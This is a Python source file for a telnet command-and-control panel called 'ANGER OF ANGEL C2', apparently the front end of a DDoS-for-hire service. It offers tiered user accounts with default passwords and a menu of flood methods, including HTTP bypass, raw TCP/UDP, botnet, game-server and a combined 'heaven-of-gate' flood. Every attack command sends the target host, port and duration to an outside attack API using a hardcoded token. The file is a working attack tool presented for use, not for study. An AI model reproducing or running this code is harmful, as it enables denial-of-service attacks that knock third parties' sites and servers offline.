#!/usr/bin/env python3
"""
ANGER OF ANGEL C2 - Telnet Command & Control
Management port: 8019
Attack port:     2092
"""

import socket
import threading
import json
import os
import time
import requests
import sys

# ============================================================
# CONFIGURATION
# ============================================================
API_TOKEN = "p0FRrBn17gdy2pDlTKEkB8"
ATTACK_URL = "https://api.l7srv.su/attack"
STOP_URL = "https://api.l7srv.su/stop"
USER_DB_FILE = "users.json"
DEFAULT_MAX_CONCURRENT = 10
DEFAULT_MAX_DURATION = 3600
MANAGEMENT_PORT = 8019
ATTACK_PORT = 2092

# ============================================================
# ANSI COLORS
# ============================================================
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
GOLD = "\033[38;5;220m"   # Bright gold for PRO MAX

# ============================================================
# FULL ATTACK LOGO (your ASCII art – shortened for display)
# ============================================================
ATTACK_LOGO = r"""
............................................:+:;;::...:.::;.:.:;;..:::::::....:...:..:...::::::..:::
....................................................................................................
....................................................................................................
....................................................................................................
..............................................:.....................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
;$x....::....;&+............+;;:::.$$..:&+.$$....:.............X&&:............x&&&+..........&&&&&$
$&&x...&&....:&x............;;&&++:&$..:&x.$&..$&X$&x.........x&x&x...&&x.:&;:$$:.+$x:x&XX$$;:$&..+&
&;x&+..$$....:&X..............&$...$&&$$&X.&&..$&$+:.........+&$X$&;..$&&$.&+X&;.X&&&.$&Xx++..$&$&&;
&&&&&;.&$.....&$;;;;.........:&X...X&..:&&.$&.+x.;X&X.......;&X.:;&X..&$:&&&+:&$:.:&&.&$::::..$&:.$&
;...XX:&$&&&;.xx++;:.........:&x...x$..:XX.$$.;&&$$&x.............:;..&$..&&x..x$$$x..&&&$$X..xX:..:
....................................................................................................
&&&&&&$&Xx+;+x+x++;;+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;+;x;;;;;;++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$$$$&&$X$Xx++++;;;;+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;;x;X;xxxxX&&XXXx;;;;;;;;;;;;;;;;;;;;;;;;;;
xX$XX$XXXxXxXx;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;;;;;;++++xXXX$&&&&&&&$$XxXx+x++;;;;;;;;;;;;;;;
XXXX$$$$$&$XXxx+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;x+x$$$$$$$X&$X&&&&&&&$&&&$Xxxxx+++x;;xx+;;
$$$$$$$$$$&&$xXx;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+x+;;+X$$$$$$XXXx++X$&&&&&&&&&&&&&$$$XX$Xx+xxxX
$$&&$&&&&&&&&&$x;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;xX++;;;+x+xx+xx++;++;;+;xX+++;;+X$&X;+++;;;;;+;++x
&$$$$&$$$$$&$xx+;;;+XxX$$;;;+++;;;;;;;;;;;;;;;+;+++xXx;++;+;++++++;;;;+;+;;+;;;;;;;;;;;;;;;;;;;;;+++
$&$&$&&xXX$Xx++Xx+x&$&&&X&$$x+++x;;;;;;;;;;;;;;;;;;;+xx;;;;;;;+;++++++++xx++xX++xxx+xxx++x+;;;;;;;;;
&$+$xX$;x+xxXxX$&&&&&&&&&&$&$$x+x;;+;;;;;;++;;;;;;;;+;;;;;;;;;;;;+++++xxxXX$$$&&&&&&$$$XXxx++;;;;;;;
$$+X$X$+xXxXX&&&&&&&&&&&&&&&$Xxx+x++;;;+;+;;;;;;;;;;;;;;;+;;;;;;+XXxxxX$$&&&&&&&&&&&&&&&&&&$$+x+;;;;
$$Xx+Xx$+$$&&&&$$&&&&&&$&&$&$$$$XXX+;+;+;;;;;;;;;;;;;;;;;;;;;+++xXXXX$&&&&&&&&&&$$$xx$$&&&&&&&$Xx+++
xx;x$$$&&&&&&&&&&&&$&&&&$&&&$&$$$X$$XxxX++;;;;;;;;;;;;;;;;;++xXX$$$$$&&&&&$$X$$xXx++++;;;;+X&&&&$Xx+
X$$$&&&&&&&&&&&&&&&$&&&&&&&&&&&&&&&$$X$$$xx;;;;;;;;;;;;;;;+xxxxXX$$$X$&$X$$&&&&&&&&&&&&&&++XX+$&&&$x
&&&&&&$&&&&&&&&&&$$&&&&&&&&&&&&&$&&&&&&&&$X+;;;;;;;;;;;;;;;XxXXXX$X++XX$&$&$&&&&&&&&&&&&&&&&$$xX&&&&
&&&&&&&&&&&&$X&&&&&&&&&&&&&&&&&&&&&&&&&&&&$X+;;;;;;;;;;;;;;++xxXXx;;X$$$$&&&&&&&&&&&$;x&&$&&&&&$X&&&
&&&&&&$&&&&$xX$$&&&&&&&&&&&&&&&&&&&&&&&&&&&&X+;;;;;;;;;;;;;;;;+++;;x$$&&&&&&$&$$$&&&&$X$&$;+&&&&&xX&
&&&&&&&$xxXX$&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&$+;;;;;;;;;;;;;;;;;;;;x$$$&&&&$xX$&xXX$&$xXX$+;;;X&$$&&X
&&&&&$XXXXX$&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&$$x;;;;;;;;;;;;;;;;;;+X$&&&&&$XXxxX$X+xxxX$$+;;;;+x+xXXx
&$&$XX$$$$$&$&&$&&&&&&&&&&&&&&&&&&&&&&&&$$&&&$$+;;;;;;;;;;;;;;;;;;;;;$X$&$X+++;;+x+++;;;;+;;;;;;+x++
&&$XX$&$$x;;;;;;;;+X$&&&&&&&&&&&&&&&&&&&&&&&&&$x+;;;;;;;;;;;;;;;;;;+;xXXx+x$$XxXX$X++;+;;;;;;;;;;+;;
$$&$$&$x;;;;;;;x;;;;;;;;X&&$&&$$&&$$$$$$&&$&&&$$x+;;;;;;;;;;;;;;;;;++;;;x$$xXX$xXx+x;;+;;;;;;;;;;;;;
&&$&&$xx$+x$&&&$$XXx+;;;;x&&&&&&&&&$&&&$&&&&&$$&Xx;;;;;;;;;;;;;;;;;xXX$$$$XXXXXXxxx+;;;;;;;;;;;;;;;;
&&&&&&&&&&&&&&&&&&&&&&&$x;x&&&&&&&&&&&&&&&$&&&&&&X+;;;;;;;;;;;;;;;;;;+xxxX&&$$&Xxxxx+++;;;;;;;;;;;;;
&&&&&&&&&&&&&x+&&x;;+$&&&&&&&&$&&&&&$&&&$&$&&&&&&&X+;;;;;;;;;;;;;;;;+;;x+;++;+;++x+++;;;;;;;;;;;;;;;
&&&&&&&&$$&&&&$$$X;;;;+&&&&&&&&&&&&$&&&&&&&&&&&&&&$x+;;;;;;;;;;;;;;;;+x;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&$XX$$$XX$$;;;;+++X$&&&&&&&&&&&&&&&&&&&&&&&&&$X+;;;;;;;;;;;;;;;;;;;;;;+;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&Xx;++XX+;+;;+;;;;+$&&&&&&&&&&&&&&&&&&&&&&&&&&X++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&$x+XXXXx+;;;;;;++$&&&&&&&&&&&&&&&&&&&&&&&&&$Xx+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&$$X$$&$$&$&Xxxx++;;++xX&&&&&&&&&&&&&$&&&&&&&&&&$x++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&&&$$&xxxx;;++xX$&&&&$&&&&&&&&&&&&&&&&&&&x;+;+++;+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$&&&&&&&&&$$$$XXX$XXx+X&&&&&&&&&&&&&&&&&&&&&&&&X;;;;++++++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&$&&$&&&&&&$$$XxX$xx;x&&&&&&&&&&&&&&&&&&&&&&&$$;;;;;;+x;++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$&&&&&&&&&&$$Xx+++++x$&&&&&&&&&&&&&&&&&&&&&&&&+;;;;;++x+++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&$X&XXx+xx;;;X&&&&&&&&&&&&&&&&&&&&&&&&&x;;;;;+xXxx+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&$$XXxX+xx++;X&&&&&&&&&&&&&&&&&&&&&&&&&x;;;;;;xX$&$X+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&$$&&&$XXxXxx+++X&&&&&&&&&&&&&&&&$&&$&&&$&+;;;;;;;x$&&&$x+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&$&&&$$$XXxxxxxxX$&&&&&&&&&&&&&&&&&&&&$&&&+;;;;;;+X$&&&&&$x+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&$&$X$$X$$XxX&&&&&&&$&&&$&&&&&&&&&&&&&+;;;;;;;X$&&&&&$&$X++;;;;;;++xxx;;;;;;;;;;;;;;;;;;;;;;;;;;
$&&&&&&$$$$X$X$$&&&&&&&&&&&&&&&&&&&&&&&&&$;;;;;;;$&&&&&&&&&&$X+xx+;;X&&&&&&x;;;;;;;;;;;;;;;;;;;;;;;;
:..::...............................................................................................
+..$$.;$&&$x.$&$&&&:.XX$$$+.....x&&&&&$..+XXx:......$$&&&$..;Xxxxx;.....;;.....+$&$X;.;+......x&&&&&
;.:&$.$&;:+x.X&+;;;..$&..;&$......;&X..:&&:.+&$.....&$..+&;.x&;:::.....:&$....$&;..x&x:&$..$&:;&x::;
:::&$..;X&&&:x&X+;;..$&...&&:.....;&X..x&:...$&:....X&$XX&$.X&&$$&:....:&&....$&...:&$.$&.+&+.:&$++;
&&&$:.&&;:X&;;&X+xxx.X&..;$$......;&X..;&X..:$&.....+&+;;&$:X&:........:&&....X&x::X&+.:&$&$...$$++x
.:....:;xx+:..;::::..x&&$X;.......:;;...:$$&&x......;x+;;:..$&&&&&x.....&&&&&&.:x$$+....X&&....;;:::
....:...............................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
..................................................;:................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
"""

# ============================================================
# METHODS DEFINITION
# ============================================================
FREE_METHODS = ["dns", "browser-free", "tls-free"]

ALL_METHODS = [
    "browser-free", "tls-free", "httpbypass", "slavaRussiaBypass",
    "http-meta", "browser", "http", "HTTP-RATELIMIT", "HTTP-CUSTOM",
    "http-raw", "http-loadbalance", "priv-flood", "priv-bypass", "priv-tor",
    "ultra-priv-flood", "ULTRA-BYPASS", "ultra", "tcp-raw", "ovh-raw",
    "udp-raw", "holder", "tcp-botnet", "udp-botnet", "ovh-botnet",
    "game", "roblox", "fivem", "tcp", "ovh", "syn", "ssh", "discord",
    "udp-vse", "dns", "heaven-of-gate"
]

HEAVEN_METHODS = [
    ("tls-free", 2),
    ("priv-flood", 2),
    ("httpbypass", 2),
    ("browser", 2),
    ("http", 2)
]

METHOD_CATEGORIES = {
    "FREE": ["dns", "browser-free", "tls-free"],
    "NORMAL": ["httpbypass", "slavaRussiaBypass", "http-meta", "tcp", "ovh", "syn", "ssh", "discord", "udp-vse", "game"],
    "GAME": ["game", "roblox", "fivem"],
    "PREMIUM": ["browser", "http", "HTTP-RATELIMIT", "HTTP-CUSTOM", "http-raw"],
    "PRIVATE": ["http-loadbalance", "priv-flood", "priv-bypass", "priv-tor", "ultra-priv-flood", "ULTRA-BYPASS", "ultra"],
    "RAW": ["tcp-raw", "ovh-raw", "udp-raw", "holder"],
    "BOTNET": ["tcp-botnet", "udp-botnet", "ovh-botnet"],
    "SPECIAL": ["heaven-of-gate"]
}

# ============================================================
# USER MANAGEMENT
# ============================================================
DEFAULT_USERS = {
    "admin":   {"password": "admin123", "role": "admin", "max_concurrent": 10, "max_duration": 3600},
    "vip1":    {"password": "vip123",   "role": "vip",   "max_concurrent": 10, "max_duration": 3600},
    "guest1":  {"password": "guest123", "role": "guest", "max_concurrent": 5,  "max_duration": 300},
    "pro_max": {"password": "promax",   "role": "pro_max", "max_concurrent": 10, "max_duration": 3600}
}

active_attacks = {}

def load_users():
    if os.path.exists(USER_DB_FILE):
        with open(USER_DB_FILE, 'r') as f:
            return json.load(f)
    else:
        save_users(DEFAULT_USERS)
        return DEFAULT_USERS

def save_users(users):
    with open(USER_DB_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def authenticate(username, password):
    users = load_users()
    if username in users and users[username].get("password") == password:
        return users[username].get("role")
    return None

def add_user(username, password, role, max_concurrent, max_duration):
    users = load_users()
    if username in users:
        return False
    if role not in ["admin", "vip", "guest", "pro_max"]:
        return False
    users[username] = {
        "password": password,
        "role": role,
        "max_concurrent": max_concurrent,
        "max_duration": max_duration
    }
    save_users(users)
    return True

def delete_user(username):
    users = load_users()
    if username not in users:
        return False
    if username == "admin":
        return False
    del users[username]
    save_users(users)
    return True

def list_users():
    users = load_users()
    return {u: info for u, info in users.items()}

def get_user_info(username):
    users = load_users()
    return users.get(username, {})

def change_password(username, new_password):
    users = load_users()
    if username not in users:
        return False
    users[username]["password"] = new_password
    save_users(users)
    return True

def get_available_methods(role):
    if role == "guest":
        return FREE_METHODS
    else:
        return ALL_METHODS  # vip, admin, pro_max all get full access

# ============================================================
# TELNET HANDLER
# ============================================================
class TelnetHandler(threading.Thread):
    def __init__(self, client_socket, address, server_type):
        threading.Thread.__init__(self)
        self.client = client_socket
        self.address = address
        self.server_type = server_type
        self.username = None
        self.role = None
        self.authenticated = False
        self.running = True

    def send(self, msg):
        try:
            self.client.send((msg + "\r\n").encode('utf-8'))
        except:
            pass

    def send_raw(self, data):
        try:
            self.client.send(data.encode('utf-8'))
        except:
            pass

    def type_text(self, text, delay=0.03):
        for ch in text:
            self.send_raw(ch)
            time.sleep(delay)
        self.send_raw("\r\n")

    def get_prompt(self):
        if self.role == "admin":
            colors = [RED, YELLOW, GREEN, CYAN, MAGENTA, BLUE]
            name = f"{self.username}: "
            colored_name = ""
            for i, ch in enumerate(name):
                colored_name += colors[i % len(colors)] + ch
            return f"{BOLD}{BLUE}< ADMIN ACCESS >{RESET} {colored_name}{RESET}"
        elif self.role == "pro_max":
            return f"{BOLD}{BLUE}< PRO MAX ACCESS >{RESET} {GOLD}{self.username}: {RESET}"
        elif self.role == "vip":
            return f"{BOLD}{BLUE}< VIP ACCESS >{RESET} {GREEN}{self.username}: {RESET}"
        elif self.role == "guest":
            return f"{BOLD}{BLUE}< GUEST ACCESS >{RESET} {RED}{self.username}: {RESET}"
        else:
            return f"{BOLD}{BLUE}< UNKNOWN >{RESET} {self.username}: "

    def send_banner(self):
        self.send("ANGER OF ANGEL C2")
        self.send("="*60)
        self.send(f"Port: {self.client.getsockname()[1]}")
        self.send("="*60 + "\r\n")

    def login(self, username, password):
        info = get_user_info(username)
        if info and info.get("password") == password:
            self.username = username
            self.role = info.get("role")
            self.authenticated = True
            self.send(f"[+] Login successful. Role: {self.role}")
            self.send(f"[+] Max Concurrent: {info.get('max_concurrent', 10)}")
            self.send(f"[+] Max Duration: {info.get('max_duration', 3600)}s")
            return True
        else:
            self.send("[-] Invalid credentials.")
            return False

    # ---- Management Commands ----
    def handle_management(self, cmd):
        if cmd.startswith("adduser "):
            if self.role != "admin":
                self.send("[-] Admin only.")
                return
            parts = cmd.split()
            if len(parts) != 6:
                self.send("[-] Usage: adduser <username> <password> <role> <max_concurrent> <max_duration>")
                self.send("[-] Example: adduser hacker pass123 pro_max 10 3600")
                return
            _, uname, pwd, role, mcon, mdur = parts
            try:
                mcon = int(mcon)
                mdur = int(mdur)
            except ValueError:
                self.send("[-] max_concurrent and max_duration must be numbers.")
                return
            if role not in ["admin", "vip", "guest", "pro_max"]:
                self.send("[-] Role must be admin/vip/guest/pro_max")
                return
            if add_user(uname, pwd, role, mcon, mdur):
                self.send(f"[+] User {uname} added (role={role}, concurrent={mcon}, duration={mdur}s).")
            else:
                self.send("[-] User already exists.")
        elif cmd.startswith("changepass"):
            parts = cmd.split()
            if len(parts) == 2:
                if self.username is None:
                    self.send("[-] Not logged in.")
                    return
                newpass = parts[1]
                if change_password(self.username, newpass):
                    self.send("[+] Password changed successfully.")
                else:
                    self.send("[-] Failed to change password.")
            elif len(parts) == 3:
                if self.role != "admin":
                    self.send("[-] Only admin can change other users' passwords.")
                    return
                target = parts[1]
                newpass = parts[2]
                if change_password(target, newpass):
                    self.send(f"[+] Password for {target} changed successfully.")
                else:
                    self.send("[-] User not found.")
            else:
                self.send("[-] Usage: changepass <new_password>   or   changepass <username> <new_password>")
        elif cmd.startswith("deluser "):
            if self.role != "admin":
                self.send("[-] Admin only.")
                return
            parts = cmd.split()
            if len(parts) < 2:
                self.send("[-] Usage: deluser <username>")
                return
            uname = parts[1]
            if delete_user(uname):
                self.send(f"[+] User {uname} deleted.")
            else:
                self.send("[-] Cannot delete user (maybe admin?).")
        elif cmd == "users":
            if self.role != "admin":
                self.send("[-] Admin only.")
                return
            users = list_users()
            self.send("Users:")
            for u, info in users.items():
                self.send(f"  {u} - {info['role']} (concurrent={info['max_concurrent']}, duration={info['max_duration']}s)")
        elif cmd == "whoami":
            self.send(f"Username: {self.username}, Role: {self.role}")
        elif cmd == "logout":
            self.authenticated = False
            self.username = None
            self.role = None
            self.send("[+] Logged out.")
        elif cmd == "help":
            self.send("Commands (management):")
            self.send("  whoami")
            self.send("  logout")
            if self.role == "admin":
                self.send("  adduser <user> <pass> <role> <concurrent> <duration>")
                self.send("  changepass <username> <newpass>")
                self.send("  deluser <username>")
                self.send("  users")
            else:
                self.send("  changepass <new_password>")
        else:
            self.send("[-] Unknown command. Type 'help'.")

    # ---- Attack Commands ----
    def handle_attack(self, cmd):
        if cmd.startswith("attack "):
            parts = cmd.split()
            if len(parts) < 6:
                self.send("[-] Usage: attack <host> <port> <time> <method> <concs>")
                return
            _, host, port, time_sec, method, concs = parts
            try:
                port = int(port)
                time_sec = int(time_sec)
                concs = int(concs)
                user_info = get_user_info(self.username)
                max_con = user_info.get('max_concurrent', DEFAULT_MAX_CONCURRENT)
                max_dur = user_info.get('max_duration', DEFAULT_MAX_DURATION)
                if concs > max_con:
                    self.send(f"[-] Concurrent cannot exceed {max_con} for your account.")
                    return
                if time_sec > max_dur:
                    self.send(f"[-] Duration cannot exceed {max_dur}s for your account.")
                    return
                if time_sec < 1:
                    self.send("[-] Time must be at least 1 second.")
                    return
            except ValueError:
                self.send("[-] Port, time, and concs must be numbers.")
                return
            available = get_available_methods(self.role)
            if method not in available:
                self.send(f"[-] Method '{method}' not available. Use 'methods'.")
                return
            if method not in ALL_METHODS:
                self.send("[-] Unknown method. Use 'methods'.")
                return

            # ---- HEAVEN OF GATE special handling ----
            if method == "heaven-of-gate":
                self.send("[*] Launching HEAVEN OF GATE flood (5 methods × 2 concs = 10 total)...")
                parent_id = f"heaven_{int(time.time())}"
                child_ids = []
                for m, c in HEAVEN_METHODS:
                    params = {
                        "token": API_TOKEN,
                        "host": host,
                        "port": port,
                        "time": time_sec,
                        "method": m,
                        "concs": c
                    }
                    try:
                        resp = requests.get(ATTACK_URL, params=params, timeout=15)
                        if resp.status_code == 200:
                            data = resp.json()
                            aid = data.get("attack_id")
                            if aid:
                                child_ids.append(aid)
                                self.send(f"  [+] {m} (concs={c}) → ID: {aid}")
                                active_attacks[aid] = {
                                    "user": self.username,
                                    "host": host,
                                    "port": port,
                                    "start": time.time(),
                                    "parent": parent_id
                                }
                            else:
                                self.send(f"  [-] {m} failed: no attack_id")
                        else:
                            self.send(f"  [-] {m} API error: {resp.status_code}")
                    except Exception as e:
                        self.send(f"  [-] {m} error: {str(e)}")
                if child_ids:
                    active_attacks[parent_id] = {
                        "user": self.username,
                        "host": host,
                        "port": port,
                        "start": time.time(),
                        "children": child_ids,
                        "is_parent": True
                    }
                    self.send(f"[+] HEAVEN OF GATE flood launched. Parent ID: {parent_id}")
                else:
                    self.send("[-] HEAVEN OF GATE flood failed: no child attacks launched.")
                return

            # ---- Normal attack ----
            self.send("")
            self.type_text(ATTACK_LOGO, delay=0.005)
            self.send("")
            self.type_text("[*] Launching attack...", delay=0.05)

            params = {
                "token": API_TOKEN,
                "host": host,
                "port": port,
                "time": time_sec,
                "method": method,
                "concs": concs
            }
            try:
                resp = requests.get(ATTACK_URL, params=params, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    attack_id = data.get("attack_id")
                    if attack_id:
                        self.type_text(f"[+] Attack launched. ID: {attack_id}", delay=0.03)
                        active_attacks[attack_id] = {
                            "user": self.username,
                            "host": host,
                            "port": port,
                            "start": time.time()
                        }
                    else:
                        self.type_text(f"[-] Attack response missing attack_id: {data}", delay=0.03)
                else:
                    self.type_text(f"[-] API error: {resp.status_code}", delay=0.03)
            except Exception as e:
                self.type_text(f"[-] Error: {str(e)}", delay=0.03)

        elif cmd.startswith("stop "):
            parts = cmd.split()
            if len(parts) < 2:
                self.send("[-] Usage: stop <attackId>")
                return
            attack_id = parts[1]
            if attack_id in active_attacks and active_attacks[attack_id].get("is_parent"):
                if self.role != "admin" and active_attacks[attack_id].get("user") != self.username:
                    self.send("[-] You can only stop your own attacks.")
                    return
                children = active_attacks[attack_id].get("children", [])
                for cid in children:
                    params = {"token": API_TOKEN, "attackId": cid}
                    try:
                        resp = requests.get(STOP_URL, params=params, timeout=10)
                        if resp.status_code == 200:
                            self.send(f"[+] Child attack {cid} stopped.")
                        else:
                            self.send(f"[-] Failed to stop child {cid}")
                    except:
                        pass
                    if cid in active_attacks:
                        del active_attacks[cid]
                del active_attacks[attack_id]
                self.send(f"[+] HEAVEN OF GATE flood {attack_id} stopped (all children).")
                return
            if self.role != "admin" and active_attacks.get(attack_id, {}).get("user") != self.username:
                self.send("[-] You can only stop your own attacks.")
                return
            if attack_id not in active_attacks:
                self.send("[-] Attack ID not found or already stopped.")
                return
            params = {"token": API_TOKEN, "attackId": attack_id}
            try:
                resp = requests.get(STOP_URL, params=params, timeout=10)
                if resp.status_code == 200:
                    self.send(f"[+] Attack {attack_id} stopped.")
                    del active_attacks[attack_id]
                else:
                    self.send(f"[-] Stop failed: {resp.status_code}")
            except Exception as e:
                self.send(f"[-] Error: {str(e)}")

        elif cmd == "status":
            if active_attacks:
                self.send("Active attacks:")
                for aid, info in active_attacks.items():
                    if info.get("is_parent"):
                        self.send(f"  {aid} - HEAVEN OF GATE flood ({info['host']}:{info['port']}) [{info['user']}]")
                    else:
                        self.send(f"  {aid} - {info['host']}:{info['port']} ({info['user']})")
            else:
                self.send("No active attacks.")

        elif cmd == "methods":
            avail = get_available_methods(self.role)
            self.send(f"Available methods for role '{self.role}':")
            for cat, methods in METHOD_CATEGORIES.items():
                show = [m for m in methods if m in avail]
                if show:
                    self.send(f"  [{cat}] {', '.join(show)}")
            if not avail:
                self.send("  (none)")

        elif cmd == "help":
            self.send("Commands (attack):")
            self.send("  attack <host> <port> <time> <method> <concs>")
            self.send("  stop <attackId>")
            self.send("  status")
            self.send("  methods")
            self.send("  logout")
            self.send("  whoami")
        elif cmd == "whoami":
            self.send(f"Username: {self.username}, Role: {self.role}")
        elif cmd == "logout":
            self.authenticated = False
            self.username = None
            self.role = None
            self.send("[+] Logged out.")
        else:
            self.send("[-] Unknown command. Type 'help'.")

    # ---- Main loop ----
    def run(self):
        self.send_banner()
        self.send("Welcome to ANGER OF ANGEL C2.")
        self.send("Please log in.")
        while self.running:
            try:
                if not self.authenticated:
                    self.send_raw("login: ")
                    data = self.client.recv(1024).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    data = data.strip()
                    if not data:
                        continue
                    if data.lower().startswith("login "):
                        parts = data.split()
                        if len(parts) != 3:
                            self.send("[-] Usage: login <username> <password>")
                            continue
                        _, user, pwd = parts
                        if self.login(user, pwd):
                            self.send("[+] You are now logged in. Use 'help' for commands.")
                        continue
                    else:
                        self.send("[-] Please login first: login <username> <password>")
                        continue
                else:
                    prompt = self.get_prompt()
                    self.send_raw(prompt)
                    data = self.client.recv(1024).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    data = data.strip()
                    if not data:
                        continue
                    if self.server_type == 'management':
                        self.handle_management(data)
                    else:
                        self.handle_attack(data)
            except Exception as e:
                self.send(f"[-] Error: {e}")
                break
        self.client.close()

# ============================================================
# SERVER LAUNCH
# ============================================================
def start_server(port, server_type):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[*] {server_type.capitalize()} server listening on port {port}")
    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr} on {port}")
        handler = TelnetHandler(client, addr, server_type)
        handler.start()

if __name__ == "__main__":
    load_users()
    print("ANGER OF ANGEL C2 starting...")
    print(f"Management port: {MANAGEMENT_PORT}")
    print(f"Attack port:     {ATTACK_PORT}")
    t1 = threading.Thread(target=start_server, args=(MANAGEMENT_PORT, 'management'), daemon=True)
    t2 = threading.Thread(target=start_server, args=(ATTACK_PORT, 'attack'), daemon=True)
    t1.start()
    t2.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0)